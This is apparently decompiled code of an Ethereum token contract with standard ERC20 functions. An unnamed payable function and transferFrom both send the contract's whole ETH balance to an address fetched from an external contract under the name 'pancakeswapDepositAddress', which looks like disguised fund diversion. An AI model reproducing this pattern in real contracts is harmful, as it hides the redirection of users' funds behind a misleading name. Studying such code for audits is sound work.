contract main {




// =====================  Runtime code  =====================


address stor0;
mapping of uint256 balances;
mapping of uint256 allowance;
uint256 decimals;
uint256 totalSupply;
array of uint256 name;
array of uint256 symbol;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return totalSupply
}

function balances(address arg1) {
    require calldata.size - 4 >= 32
    return balances[arg1]
}

function decimals() {
    return decimals
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    return balances[address(arg1)]
}

function symbol() {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[arg1][arg2]
}

function _fallback() payable {
    revert
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if balances[address(msg.sender)] < arg2:
        revert with 0, 'balance too low'
    balances[address(arg1)] += arg2
    balances[address(msg.sender)] -= arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function sub_e715d2ce(?) payable {
    require ext_code.size(stor0)
    staticcall stor0.pancakeswapDepositAddress() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    call ext_call.return_data[12 len 20] with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    if balances[address(arg1)] < arg3:
        revert with 0, 'balance too low'
    if allowance[address(arg1)][address(msg.sender)] < arg3:
        revert with 0, 'allowance too low'
    balances[address(arg2)] += arg3
    balances[address(arg1)] -= arg3
    emit Transfer(arg3, arg1, arg2);
    require ext_code.size(stor0)
    staticcall stor0.pancakeswapDepositAddress() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    call ext_call.return_data[12 len 20] with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    return 1
}



}
